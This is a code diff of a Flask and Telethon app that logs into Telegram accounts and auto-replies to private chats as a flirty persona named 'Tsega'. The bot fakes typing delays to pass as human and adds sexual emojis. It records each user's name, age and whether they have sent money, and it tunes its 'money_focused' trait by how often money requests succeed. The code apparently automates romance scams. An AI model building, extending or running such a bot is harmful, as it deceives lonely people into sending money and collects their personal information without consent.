+        if total_success + total_failed > 0:
+            flirty_success = patterns['successful_intents'].get('flirty', 0)
+            flirty_total = flirty_success + patterns['failed_intents'].get('flirty', 0)
+            if flirty_total > 5:
+                flirty_rate = flirty_success / flirty_total
+                if flirty_rate > 0.7:
+                    traits['flirty'] = min(0.9, traits['flirty'] + 0.05)
+                elif flirty_rate < 0.3:
+                    traits['flirty'] = max(0.3, traits['flirty'] - 0.05)
+            
+            money_success = patterns['successful_intents'].get('money_request', 0)
+            money_total = money_success + patterns['failed_intents'].get('money_request', 0)
+            if money_total > 5:
+                money_rate = money_success / money_total
+                if money_rate > 0.4:
+                    traits['money_focused'] = min(0.8, traits['money_focused'] + 0.03)
+                elif money_rate < 0.1:
+                    traits['money_focused'] = max(0.3, traits['money_focused'] - 0.05)
+        
+        evolution['learning_iterations'] += 1
+        evolution['last_evolution'] = time.time()
+        
+        save_learning_data()
+        save_personality_evolution()
+        
+        logger.info(f"🧠 Tsega's personality evolved for account {self.account_id}")
+    
+    def get_evolved_reply(self, intent, user_id=None):
+        """Get an evolved reply based on learning"""
+        data = learning_data[self.account_id]
+        replies = data['replies']
+        traits = data['evolution']['personality_traits']
+        patterns = data['patterns']
+        
+        if intent not in replies:
+            intent = 'default'
+        
+        available_replies = replies[intent]
+        
+        if user_id and user_id in patterns['user_preferences']:
+            user_intents = patterns['user_preferences'][user_id]
+            if user_intents:
+                top_intent = max(user_intents.items(), key=lambda x: x[1])[0]
+                if top_intent != intent and random.random() < 0.3:
+                    if top_intent in replies:
+                        available_replies = replies[top_intent]
+        
+        reply = random.choice(available_replies)
+        
+        if traits['flirty'] > 0.7 and intent not in ['money_request', 'meet']:
+            flirty_emojis = ['😘', '💋', '💕', '🔥', '💦', '😏']
+            if random.random() < 0.4:
+                reply += " " + random.choice(flirty_emojis)
+        
+        if traits['talkative'] > 0.6 and intent not in ['goodbye']:
+            if random.random() < 0.3:
+                follow_ups = ["antess?", "min tishal?", "endet neh?", "deh new?", "tiru new?"]
+                reply += " " + random.choice(follow_ups)
+        
+        return reply
+
+# ==================== UTILITY FUNCTIONS ====================
+
+def run_async(coro_func):
+    """Run async function in new loop"""
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        if asyncio.iscoroutinefunction(coro_func):
+            return loop.run_until_complete(coro_func())
+        elif asyncio.iscoroutine(coro_func):
+            return loop.run_until_complete(coro_func)
+        else:
+            # Assume it's a function that returns a coroutine
+            return loop.run_until_complete(coro_func())
+    except Exception as e:
+        logger.error(f"Error in run_async: {e}")
+        return None
+    finally:
+        try:
+            loop.close()
+        except:
+            pass
+
+# Load/Save functions
+def load_accounts():
+    global accounts
+    try:
+        if os.path.exists(ACCOUNTS_FILE):
+            with open(ACCOUNTS_FILE, 'r') as f:
+                content = f.read().strip()
+                accounts = json.loads(content) if content else []
+        else:
+            accounts = []
+            with open(ACCOUNTS_FILE, 'w') as f:
+                json.dump([], f)
+        logger.info(f"Loaded {len(accounts)} accounts")
+    except Exception as e:
+        logger.error(f"Error loading accounts: {e}")
+        accounts = []
+
+def save_accounts():
+    try:
+        with open(ACCOUNTS_FILE, 'w') as f:
+            json.dump(accounts, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving accounts: {e}")
+        return False
+
+def load_reply_settings():
+    global reply_settings
+    try:
+        if os.path.exists(REPLY_SETTINGS_FILE):
+            with open(REPLY_SETTINGS_FILE, 'r') as f:
+                content = f.read().strip()
+                reply_settings = json.loads(content) if content else {}
+        else:
+            reply_settings = {}
+            with open(REPLY_SETTINGS_FILE, 'w') as f:
+                json.dump({}, f)
+        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
+    except Exception as e:
+        logger.error(f"Error loading reply settings: {e}")
+        reply_settings = {}
+
+def save_reply_settings():
+    try:
+        with open(REPLY_SETTINGS_FILE, 'w') as f:
+            json.dump(reply_settings, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving reply settings: {e}")
+        return False
+
+def load_conversation_history():
+    global conversation_history
+    try:
+        if os.path.exists(CONVERSATION_HISTORY_FILE):
+            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
+                content = f.read().strip()
+                conversation_history = json.loads(content) if content else {}
+        else:
+            conversation_history = {}
+            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
+                json.dump({}, f)
+    except Exception as e:
+        logger.error(f"Error loading conversation history: {e}")
+        conversation_history = {}
+
+def save_conversation_history():
+    try:
+        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
+            json.dump(conversation_history, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving conversation history: {e}")
+        return False
+
+def load_user_context():
+    global user_context
+    try:
+        if os.path.exists(USER_CONTEXT_FILE):
+            with open(USER_CONTEXT_FILE, 'r') as f:
+                content = f.read().strip()
+                user_context = json.loads(content) if content else {}
+        else:
+            user_context = {}
+            with open(USER_CONTEXT_FILE, 'w') as f:
+                json.dump({}, f)
+    except Exception as e:
+        logger.error(f"Error loading user context: {e}")
+        user_context = {}
+
+def save_user_context():
+    try:
+        with open(USER_CONTEXT_FILE, 'w') as f:
+            json.dump(user_context, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving user context: {e}")
+        return False
+
+def load_learning_data():
+    global learning_data
+    try:
+        if os.path.exists(LEARNING_DATA_FILE):
+            with open(LEARNING_DATA_FILE, 'r') as f:
+                content = f.read().strip()
+                learning_data = json.loads(content) if content else {}
+        else:
+            learning_data = {}
+            with open(LEARNING_DATA_FILE, 'w') as f:
+                json.dump({}, f)
+        logger.info(f"Loaded learning data for {len(learning_data)} accounts")
+    except Exception as e:
+        logger.error(f"Error loading learning data: {e}")
+        learning_data = {}
+
+def save_learning_data():
+    try:
+        with open(LEARNING_DATA_FILE, 'w') as f:
+            json.dump(learning_data, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving learning data: {e}")
+        return False
+
+def load_personality_evolution():
+    global personality_evolution
+    try:
+        if os.path.exists(PERSONALITY_EVOLUTION_FILE):
+            with open(PERSONALITY_EVOLUTION_FILE, 'r') as f:
+                content = f.read().strip()
+                personality_evolution = json.loads(content) if content else {}
+        else:
+            personality_evolution = {}
+            with open(PERSONALITY_EVOLUTION_FILE, 'w') as f:
+                json.dump({}, f)
+    except Exception as e:
+        logger.error(f"Error loading personality evolution: {e}")
+        personality_evolution = {}
+
+def save_personality_evolution():
+    try:
+        with open(PERSONALITY_EVOLUTION_FILE, 'w') as f:
+            json.dump(personality_evolution, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving personality evolution: {e}")
+        return False
+
+# Load all data
+load_accounts()
+load_reply_settings()
+load_conversation_history()
+load_user_context()
+load_learning_data()
+load_personality_evolution()
+
+# ==================== INTENT DETECTION ====================
+
+def detect_intent(message, user_data=None):
+    """Detect user intent from message"""
+    if not message:
+        return "default"
+    
+    msg = message.lower().strip()
+    
+    money_keywords = ['birr', 'ብር', 'money', 'cash', 'ገንዘብ', 'telebirr', 'ቴሌብር', 
+                      'send', 'ላክ', '1000', '500', '2000']
+    if any(word in msg for word in money_keywords):
         return "money_request"
     
-    meet_keywords = ['ማግኘት', 'meet', 'መገናኘት', 'እንገናኝ', 'ማየት', 'see', 'come']
-    if any(word in message_lower for word in meet_keywords):
+    photo_keywords = ['foto', 'ፎቶ', 'picture', 'photo', 'asay', 'አሳይ', 'litay', 'ልታይ']
+    if any(word in msg for word in photo_keywords):
+        return "photo_request"
+    
+    meet_keywords = ['magenat', 'ማግኘት', 'meet', 'engenagn', 'እንገናኝ', 'litba', 'ልትባ']
+    if any(word in msg for word in meet_keywords):
         return "meet"
     
-    call_keywords = ['ድምጽ', 'voice', 'call', 'ስልክ', 'phone', 'ደውል', 'ring']
-    if any(word in message_lower for word in call_keywords):
+    call_keywords = ['dimts', 'ድምጽ', 'voice', 'call', 'silk', 'ስልክ', 'dewli', 'ደውሊ']
+    if any(word in msg for word in call_keywords):
         return "voice_call"
     
-    appearance_keywords = ['ቆንጆ', 'beautiful', 'ቁመት', 'height', 'ጸጉር', 'hair', 'ስስ', 'slim', 'አካል', 'body']
-    if any(word in message_lower for word in appearance_keywords):
-        return "appearance"
+    if 'enibada' in msg or 'እኒባዳ' in msg:
+        return "enibada"
+    if 'libdash' in msg or 'ልብዳሽ' in msg:
+        return "libdash"
+    if 'konjo' in msg or 'ቆንጆ' in msg:
+        return "konjo"
     
-    relationship_keywords = ['ፍቅር', 'love', 'ልብ', 'heart', 'ብቻ', 'only', 'የኔ', 'mine', 'የአንተ', 'yours']
-    if any(word in message_lower for word in relationship_keywords):
-        return "relationship"
-    
-    if message_lower.startswith('/'):
-        return "command"
-    
-    if any(phrase in message_lower for phrase in ['i am busy', "i'm busy", 'im busy', 'busy right now']):
-        return "busy"
-    
-    if not message_lower:
+    greetings = ['selam', 'ሰላም', 'hi', 'hello', 'hey', 'ta di yas', 'ታዲያስ', 
+                 'dehna deresu', 'ደህና ደረሱ', 'ey', 'እይ']
+    if any(word in msg for word in greetings) and len(msg) < 30:
         return "greeting"
     
-    current_hour = datetime.now().hour
-    if any(word in message_lower for word in ['good morning', 'gm', 'እንደምን አደርክ']):
-        return "morning"
-    if any(word in message_lower for word in ['good afternoon', 'good evening', 'እንደምን አመሸህ']):
-        return "evening"
-    if any(word in message_lower for word in ['good night', 'gn', 'sweet dreams', 'ደህና ተኛ']):
-        return "night"
-    
-    greetings = ['hi', 'hello', 'hey', 'hy', 'hola', 'hiya', 'howdy', 'ሰላም', 'ታዲያስ', 'ሃይ']
-    if any(word in message_lower for word in greetings) and len(message_lower) < 20:
-        return "greeting"
-    
-    how_are_you = ['how are you', 'how r u', 'how you doing', 'how\'s it going', 'what\'s up', 'sup', 'እንደምን ነህ', 'ደህና ነህ', 'ምን አለ']
-    if any(phrase in message_lower for phrase in how_are_you):
+    how_are = ['endet neh', 'እንዴት ነህ', 'deh new', 'ደህ ነው', 'how are', 'how r u']
+    if any(phrase in msg for phrase in how_are):
         return "how_are_you"
     
-    what_doing = ['what are you doing', 'what r u doing', 'what doing', 'wyd', 'what are you up to', 'ምን ትሰራለህ', 'ምን እየሰራህ ነው']
-    if any(phrase in message_lower for phrase in what_doing):
+    doing = ['min tiseraleh', 'ምን ትሰራለህ', 'what doing', 'what are you doing']
+    if any(phrase in msg for phrase in doing):
         return "what_doing"
     
-    if any(phrase in message_lower for phrase in ['your name', 'what is your name', 'who are you', 'u call yourself', 'ስምህ ማን ነው', 'ስምስ']):
+    if 'simih man' in msg or 'ስምህ ማን' in msg or 'your name' in msg:
         return "ask_name"
     
-    if any(phrase in message_lower for phrase in ['your age', 'how old are you', 'what is your age', 'you born', 'ዕድሜህ', 'አመት']):
+    if 'edmeh sint' in msg or 'እድሜህ ስንት' in msg or 'how old' in msg:
         return "ask_age"
     
-    location_words = ['where are you from', 'where do you live', 'your location', 'which country', 'what city', 'የት ነህ', 'የት ትኖራለህ', 'ከየት ነህ']
-    if any(phrase in message_lower for phrase in location_words):
+    location = ['yet nesh', 'የት ነሽ', 'where are you', 'from where']
+    if any(phrase in msg for phrase in location):
         return "ask_location"
     
-    job_words = ['what do you do', 'your job', 'your work', 'what work', 'profession', 'career', 'occupation', 'ምን ትሰራለህ', 'ሥራህ']
-    if any(phrase in message_lower for phrase in job_words):
+    job = ['min tiseraleh', 'ምን ትሰራለህ', 'what do you do', 'your job']
+    if any(phrase in msg for phrase in job):
         return "ask_job"
     
-    hobby_words = ['hobbies', 'free time', 'what do you like to do', 'what are your interests', 'passionate about', 'ትርፍ ጊዜ', 'ምን ትወዳለህ']
-    if any(phrase in message_lower for phrase in hobby_words):
-        return "ask_hobbies"
+    if 'endemin aderk' in msg or 'good morning' in msg or 'melkam nigt' in msg:
+        return "morning"
+    if 'dehna tenya' in msg or 'good night' in msg:
+        return "night"
     
-    language_words = ['languages', 'what language', 'do you speak', 'tongues', 'multilingual', 'ቋንቋ', 'ምን ትናገራለህ']
-    if any(phrase in message_lower for phrase in language_words):
-        return "languages"
+    if 'ewodalehu' in msg or 'እወድሃለሁ' in msg or 'love you' in msg:
+        return "love"
+    if 'nafkehalew' in msg or 'ናፍቀሃለው' in msg or 'miss you' in msg:
+        return "miss"
+    if 'amechign' in msg or 'አሜቺግን' in msg or 'jealous' in msg:
+        return "jealous"
     
-    work_words = ['work', 'job', 'office', 'colleague', 'boss', 'career', 'profession', 'ሥራ', 'ትምህርት']
-    if any(word in message_lower for word in work_words):
-        return "work"
-    
-    weekend_words = ['weekend', 'friday', 'saturday', 'sunday', 'days off', 'ቅዳሜ', 'እሁድ', 'ሳምንት መጨረሻ']
-    if any(word in message_lower for word in weekend_words):
-        return "weekend"
-    
-    weather_words = ['weather', 'rain', 'sunny', 'cloudy', 'hot', 'cold', 'temperature', 'forecast', 'አየር', 'ዝናብ', 'ፀሐይ']
-    if any(word in message_lower for word in weather_words):
-        return "weather"
-    
-    food_words = ['food', 'eat', 'hungry', 'lunch', 'dinner', 'breakfast', 'restaurant', 'cook', 'recipe', 'meal', 'ምግብ', 'በላ', 'እንጀራ']
-    if any(word in message_lower for word in food_words):
-        return "food"
-    
-    travel_words = ['travel', 'trip', 'vacation', 'holiday', 'visit', 'country', 'city', 'tourist', 'fly', 'መጓዝ', 'ጉዞ', 'አዳማ', 'ጀሞ']
-    if any(word in message_lower for word in travel_words):
-        return "travel"
-    
-    movie_words = ['movie', 'film', 'watch', 'show', 'series', 'netflix', 'episode', 'cinema', 'theatre', 'ፊልም', 'ቴሌቪዥን']
-    if any(word in message_lower for word in movie_words):
-        return "movies"
-    
-    music_words = ['music', 'song', 'sing', 'playlist', 'spotify', 'genre', 'band', 'artist', 'concert', 'ሙዚቃ', 'ዘፈን']
-    if any(word in message_lower for word in music_words):
-        return "music"
-    
-    sports_words = ['sport', 'game', 'match', 'team', 'play', 'ball', 'football', 'cricket', 'gym', 'workout', 'ስፖርት', 'ኳስ']
-    if any(word in message_lower for word in sports_words):
-        return "sports"
-    
-    book_words = ['book', 'read', 'reading', 'novel', 'author', 'library', 'chapter', 'story', 'መጽሐፍ', 'ማንበብ']
-    if any(word in message_lower for word in book_words):
-        return "books"
-    
-    flirty_words = ['beautiful', 'handsome', 'cute', 'pretty', 'gorgeous', 'sexy', 'hot', 'attractive', 'lovely', 'ማማ', 'ቆንጆ', 'ልጅ', 'ውዴ', 'ልቤ']
-    if any(word in message_lower for word in flirty_words):
-        return "flirty"
-    
-    thanks_words = ['thanks', 'thank you', 'thx', 'appreciate', 'grateful', 'ty', 'አመሰግናለሁ']
-    if any(word in message_lower for word in thanks_words):
+    if 'amesegnalehu' in msg or 'አመሰግናለሁ' in msg or 'thanks' in msg:
         return "thanks"
     
-    joke_words = ['joke', 'funny', 'lol', 'haha', 'hilarious', 'lmao', '😂', '😆']
-    if any(word in message_lower for word in joke_words):
-        return "joke"
-    
-    agreement = ['agree', 'true', 'right', 'exactly', 'same here', 'me too', 'definitely', 'absolutely', 'እሺ', 'አዎ', 'ትክክል']
-    if any(word in message_lower for word in agreement):
-        return "agree"
-    
-    disagreement = ['disagree', 'not sure', 'doubt', 'different', 'not really', 'no way', 'አይደለም', 'አልስማማም']
-    if any(word in message_lower for word in disagreement):
-        return "disagree"
-    
-    surprise = ['wow', 'really', 'no way', 'seriously', 'omg', 'oh', 'what', 'wtf', 'ኦህ', 'ምን']
-    if any(word in message_lower for word in surprise):
-        return "surprise"
-    
-    if '?' in message:
-        return "curious"
-    
-    opinion_words = ['think', 'believe', 'feel', 'opinion', 'view', 'perspective', 'thoughts', 'አስብ', 'ይመስለኛል']
-    if any(word in message_lower for word in opinion_words):
-        return "opinion"
-    
-    goodbye = ['bye', 'goodbye', 'see you', 'talk later', 'cya', 'later', 'take care', 'peace', 'ደህና ሁን', 'ቻው']
-    if any(word in message_lower for word in goodbye):
+    if 'dehna hun' in msg or 'ደህና ሁን' in msg or 'bye' in msg or 'goodbye' in msg:
         return "goodbye"
     
     return "default"
 
-# ==================== AUTO-REPLY HANDLER WITH 15-40 SECOND DELAY ====================
+def extract_user_info(message, user_data):
+    """Extract user information from messages"""
+    msg = message.lower()
+    
+    name_patterns = [
+        r'(?:my name is|i am|i\'m|call me)\s+(\w+)',
+        r'^(\w+)$',
+        r'ስሜ\s+(\w+)',
+        r'እኔ\s+(\w+)'
+    ]
+    
+    for pattern in name_patterns:
+        match = re.search(pattern, msg, re.IGNORECASE)
+        if match and len(match.group(1)) > 2:
+            name = match.group(1).capitalize()
+            if name.lower() not in ['hi', 'hello', 'hey', 'yes', 'no', 'ok']:
+                user_data['name'] = name
+                break
+    
+    age_match = re.search(r'(\d+)\s*(?:years old|yrs?|old|አመት)', msg)
+    if age_match:
+        age = int(age_match.group(1))
+        if 15 < age < 100:
+            user_data['age'] = age
+    
+    return user_data
+
+# ==================== AUTO-REPLY HANDLER ====================
 
 async def auto_reply_handler(event, account_id):
-    """Handle incoming messages with sexy Tsega personality"""
+    """Handle incoming messages with Tsega's personality"""
     try:
         if event.out:
             return
         
         chat = await event.get_chat()
         
-        # ONLY reply to private users
         if hasattr(chat, 'title') and chat.title:
             return
         if hasattr(chat, 'participants_count') and chat.participants_count > 2:
-            return
-        if hasattr(chat, 'broadcast') and chat.broadcast:
-            return
-        if hasattr(chat, 'megagroup') and chat.megagroup:
             return
         
         sender = await event.get_sender()
         if not sender:
             return
         
+        user_id = str(sender.id)
         chat_id = str(event.chat_id)
         message_text = event.message.text or ""
         
-        logger.info(f"📨 Message from {chat_id}: '{message_text}'")
+        if not message_text.strip():
+            return
+        
+        logger.info(f"📨 Message from {user_id}: '{message_text[:50]}...'")
         
         account_key = str(account_id)
+        
         if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
             return
         
         chat_settings = reply_settings[account_key].get('chats', {})
-        chat_enabled = chat_settings.get(chat_id, {}).get('enabled', True)
-        
-        if not chat_enabled:
+        if not chat_settings.get(chat_id, {}).get('enabled', True):
             return
+        
+        learner = TsegaLearner(account_id)
         
         if account_key not in conversation_history:
             conversation_history[account_key] = {}
-        
         if chat_id not in conversation_history[account_key]:
             conversation_history[account_key][chat_id] = []
+        
+        if account_key not in user_context:
+            user_context[account_key] = {}
+        if user_id not in user_context[account_key]:
+            user_context[account_key][user_id] = {
+                'name': None,
+                'age': None,
+                'location': None,
+                'first_seen': time.time(),
+                'last_seen': time.time(),
+                'message_count': 0,
+                'money_sent': False,
+                'last_intent': None
+            }
+        
+        user_data = user_context[account_key][user_id]
+        user_data['last_seen'] = time.time()
+        user_data['message_count'] += 1
         
         conversation_history[account_key][chat_id].append({
             'role': 'user',
             'text': message_text,
-            'time': time.time()
+            'time': time.time(),
+            'user_id': user_id
         })
         
-        if len(conversation_history[account_key][chat_id]) > 15:
-            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-15:]
+        if len(conversation_history[account_key][chat_id]) > 20:
+            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-20:]
         
-        intent = detect_conversation_intent(message_text)
+        user_data = extract_user_info(message_text, user_data)
+        
+        intent = detect_intent(message_text, user_data)
         logger.info(f"Detected intent: {intent}")
         
-        response = get_context_aware_response(message_text, intent, conversation_history[account_key][chat_id])
+        user_data['last_intent'] = intent
         
-        if not response or response.strip() == "":
-            response = "እሺ ውዴ ንገርኝ ተጨማሪ 😘 (Okay dear tell me more 😘)"
+        response = learner.get_evolved_reply(intent, user_id)
         
-        # ===== 15-40 SECOND DELAY =====
-        # Random delay between 15 and 40 seconds to seem human
-        delay = random.randint(15, 40)
-        logger.info(f"⏱️ Waiting {delay} seconds before replying (human simulation)...")
+        if user_data.get('name'):
+            if random.random() < 0.3:
+                name = user_data['name']
+                response = response.replace('ውዴ', f"{name} ውዴ").replace('ኮንጆ', f"{name} ኮንጆ")
         
-        # Show typing indicator during the wait
+        traits = learner.evolution['personality_traits']
+        
+        if traits['flirty'] > 0.5 and random.random() < 0.4:
+            emojis = ['😘', '💋', '💕', '🔥', '💦', '😏']
+            response += " " + random.choice(emojis)
+        
+        if traits['talkative'] > 0.6 and intent not in ['goodbye', 'money_request']:
+            if random.random() < 0.3:
+                follow_ups = ["antess?", "min tishal?", "endet neh?", "deh new?"]
+                response += " " + random.choice(follow_ups)
+        
+        delay = random.randint(5, 20)
+        logger.info(f"⏱️ Typing for {delay}s...")
+        
         async with event.client.action(event.chat_id, 'typing'):
             await asyncio.sleep(delay)
         
-        # Send reply
         await event.reply(response)
-        logger.info(f"✅ Replied after {delay}s: '{response[:50]}...'")
+        logger.info(f"✅ Replied: '{response[:50]}...'")
         
         conversation_history[account_key][chat_id].append({
             'role': 'assistant',
             'text': response,
-            'time': time.time()
+            'time': time.time(),
+            'intent': intent
         })
         
+        learner.learn_from_exchange(
+            message_text,
+            response,
+            user_id,
+            intent,
+            user_responded=True
+        )
+        
         save_conversation_history()
+        save_user_context()
         
     except Exception as e:
         logger.error(f"Error in auto-reply: {e}")
-        try:
-            await event.reply("ሰላም ውዴ! ትንሽ እንነጋገር? 😘 (Hi dear! Want to chat a bit? 😘)")
-        except:
-            pass
 
-        async def start_auto_reply_for_account(account):
-    """Start auto-reply listener with AUTO-RECONNECT capability"""
+# ==================== CLIENT MANAGEMENT ====================
+
+async def start_auto_reply_for_account(account):
+    """Start auto-reply listener for an account"""
     account_id = account['id']
     account_key = str(account_id)
     reconnect_count = 0
     
-    while True:  # Infinite reconnect loop
+    while True:
         try:
-            logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
+            logger.info(f"Starting Tsega for account {account_id}")
             
-            # Create client with robust settings
             client = TelegramClient(
                 StringSession(account['session']), 
                 API_ID, 
                 API_HASH,
-                connection_retries=10,
-                retry_delay=5,
-                timeout=60,
-                device_model="iPhone 13",
-                system_version="15.0",
-                app_version="8.4.1"
+                connection_retries=5,
+                retry_delay=3,
+                timeout=30
             )
             
             await client.connect()
             
-            # Check authorization
             if not await client.is_user_authorized():
                 logger.error(f"Account {account_id} not authorized")
                 await asyncio.sleep(30)
                 reconnect_count += 1
                 continue
             
-            # Store client
             active_clients[account_key] = client
+            active_listeners[account_key] = True
             
-            # Define message handler
-            @client.on(NewMessage(incoming=True))
+            @client.on(events.NewMessage(incoming=True))
             async def handler(event):
                 await auto_reply_handler(event, account_id)
             
-            # Start client
             await client.start()
-            logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')} ({account.get('phone')})")
+            logger.info(f"✅ Tsega ACTIVE for {account.get('name')}")
             
-            # Reset reconnect count on success
             reconnect_count = 0
-            
-            # Keep running until disconnected
             await client.run_until_disconnected()
             
         except Exception as e:
-            logger.error(f"Connection lost for account {account_id}: {e}")
+            logger.error(f"Connection lost: {e}")
             if account_key in active_clients:
+                try:
+                    await active_clients[account_key].disconnect()
+                except:
+                    pass
                 del active_clients[account_key]
             
-            # Exponential backoff for reconnection
             reconnect_count += 1
-            wait_time = min(30 * reconnect_count, 300)  # Max 5 minutes
-            logger.info(f"Reconnecting in {wait_time} seconds... (attempt {reconnect_count})")
+            wait_time = min(30 * reconnect_count, 300)
             await asyncio.sleep(wait_time)
 
 def stop_auto_reply_for_account(account_id):
     """Stop auto-reply for a specific account"""
     account_key = str(account_id)
+    if account_key in active_listeners:
+        active_listeners[account_key] = False
+    
     if account_key in active_clients:
         try:
             loop = asyncio.new_event_loop()
@@ -642,9 +1036,11 @@ def stop_auto_reply_for_account(account_id):
             loop.run_until_complete(active_clients[account_key].disconnect())
             loop.close()
             del active_clients[account_key]
-            logger.info(f"Stopped auto-reply for account {account_key}")
+            logger.info(f"Stopped Tsega for account {account_key}")
+            return True
         except Exception as e:
             logger.error(f"Error stopping auto-reply: {e}")
+    return False
 
 def start_all_auto_replies():
     """Start auto-reply for all enabled accounts"""
@@ -653,51 +1049,21 @@ def start_all_auto_replies():
         if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
             if account_key not in active_clients:
                 thread = threading.Thread(
-                    target=lambda: run_async(start_auto_reply_for_account(account)),
+                    target=lambda acc=account: run_async(lambda: start_auto_reply_for_account(acc)),
                     daemon=True
                 )
                 thread.start()
                 client_tasks[account_key] = thread
                 time.sleep(2)
 
-# ==================== KEEP ALIVE SYSTEM ====================
-
-def keep_alive():
-    """Keep Render from sleeping and maintain Telegram connections"""
-    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
-    
-    while True:
-        try:
-            # Ping own app
-            requests.get(app_url, timeout=10)
-            requests.get(f"{app_url}/api/health", timeout=10)
-            
-            # Ping Telegram to keep connections alive
-            for account_key, client in list(active_clients.items()):
-                try:
-                    # Send a tiny ping to Telegram
-                    loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loop)
-                    loop.run_until_complete(client.get_me())
-                    loop.close()
-                    logger.info(f"✅ Connection alive for account {account_key}")
-                except Exception as e:
-                    logger.warning(f"⚠️ Connection may be dead for account {account_key}: {e}")
-            
-            logger.info(f"🔋 Keep-alive ping sent at {time.strftime('%H:%M:%S')}")
-        except Exception as e:
-            logger.error(f"Keep-alive error: {e}")
-        
-        time.sleep(240)  # 4 minutes
-
-# ==================== PAGE ROUTES ====================
+# ==================== API ENDPOINTS ====================
 
 @app.route('/')
 def home():
-    return send_file('login.html')
+    return send_file('home.html')
 
 @app.route('/login')
-def login():
+def login_page():
     return send_file('login.html')
 
 @app.route('/dashboard')
@@ -713,88 +1079,78 @@ def all_sessions():
     return send_file('all.html')
 
 @app.route('/settings')
-def settings():
+def settings_page():
     return send_file('settings.html')
-
-# ==================== API ROUTES ====================
 
 @app.route('/api/accounts', methods=['GET'])
 def get_accounts():
-    formatted = []
-    for acc in accounts:
-        account_key = str(acc['id'])
-        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
-        formatted.append({
-            'id': acc.get('id'),
-            'phone': acc.get('phone', ''),
-            'name': acc.get('name', 'Unknown'),
-            'auto_reply_enabled': has_reply
-        })
-    return jsonify({'success': True, 'accounts': formatted})
+    return jsonify({
+        'success': True,
+        'accounts': accounts
+    })
 
-# FIXED: Simplified add-account route with better error handling
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
+    data = request.json
+    phone = data.get('phone')
+    
+    if not phone:
+        return jsonify({'success': False, 'error': 'Phone number required'})
+    
     try:
-        data = request.json
-        if not data:
-            return jsonify({'success': False, 'error': 'No JSON data received'})
-        
-        phone = data.get('phone')
-        if not phone:
-            return jsonify({'success': False, 'error': 'Phone number required'})
-        
         if not phone.startswith('+'):
             phone = '+' + phone
         
-        logger.info(f"Adding account for phone: {phone}")
+        logger.info(f"Sending code to {phone}")
         
-        async def send_code():
-            client = TelegramClient(
-                StringSession(), 
-                API_ID, 
-                API_HASH,
-                connection_retries=3,
-                retry_delay=1,
-                timeout=15
-            )
-            try:
-                await client.connect()
-                logger.info(f"Connected to Telegram for {phone}")
-                
-                result = await client.send_code_request(phone)
-                logger.info(f"Code sent successfully to {phone}")
-                
-                session_id = str(int(time.time()))
-                temp_sessions[session_id] = {
-                    'phone': phone,
-                    'hash': result.phone_code_hash,
-                    'session': client.session.save()
-                }
-                return {'success': True, 'session_id': session_id}
-                
-            except errors.FloodWaitError as e:
-                logger.warning(f"Flood wait for {phone}: {e.seconds}s")
-                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
-            except errors.PhoneNumberInvalidError:
-                return {'success': False, 'error': 'Invalid phone number'}
-            except errors.PhoneNumberBannedError:
-                return {'success': False, 'error': 'This phone number is banned'}
-            except (OSError, ConnectionError, TimeoutError) as e:
-                logger.error(f"Network error for {phone}: {e}")
-                return {'success': False, 'error': 'Network error. Cannot reach Telegram servers.'}
-            except Exception as e:
-                logger.error(f"Unexpected error for {phone}: {e}")
-                return {'success': False, 'error': str(e)}
-            finally:
-                await client.disconnect()
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         
-        result = run_async(send_code())
-        return jsonify(result)
+        client = TelegramClient(StringSession(), API_ID, API_HASH, connection_retries=3, timeout=30)
+        loop.run_until_complete(client.connect())
+        
+        if not loop.run_until_complete(client.is_connected()):
+            raise Exception("Failed to connect to Telegram")
+        
+        result = loop.run_until_complete(client.send_code_request(phone))
+        
+        logger.info(f"Code sent to {phone}")
+        
+        session_id = hashlib.md5(f"{phone}_{time.time()}".encode()).hexdigest()
+        temp_sessions[session_id] = {
+            'client': client,
+            'phone': phone,
+            'phone_code_hash': result.phone_code_hash,
+            'created': time.time(),
+            'loop': loop
+        }
+        
+        return jsonify({
+            'success': True,
+            'session_id': session_id,
+            'message': 'Code sent successfully'
+        })
         
     except Exception as e:
-        logger.error(f"Error in add_account: {e}")
-        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
+        logger.error(f"Error: {str(e)}")
+        if 'client' in locals():
+            try:
+                loop.run_until_complete(client.disconnect())
+            except:
+                pass
+        if 'loop' in locals():
+            loop.close()
+        
+        error_msg = str(e)
+        if "PHONE_NUMBER_INVALID" in error_msg:
+            return jsonify({'success': False, 'error': 'Invalid phone number format'})
+        elif "FLOOD_WAIT" in error_msg:
+            match = re.search(r'FLOOD_WAIT_(\d+)', error_msg)
+            if match:
+                return jsonify({'success': False, 'error': f'Too many attempts. Wait {match.group(1)} seconds'})
+            return jsonify({'success': False, 'error': 'Too many attempts. Please try later'})
+        else:
+            return jsonify({'success': False, 'error': f'Failed: {error_msg}'})
 
 @app.route('/api/verify-code', methods=['POST'])
 def verify_code():
@@ -804,255 +1160,144 @@ def verify_code():
     password = data.get('password', '')
     
     if not code or not session_id:
-        return jsonify({'success': False, 'error': 'Missing code or session'})
+        return jsonify({'success': False, 'error': 'Code and session ID required'})
     
     if session_id not in temp_sessions:
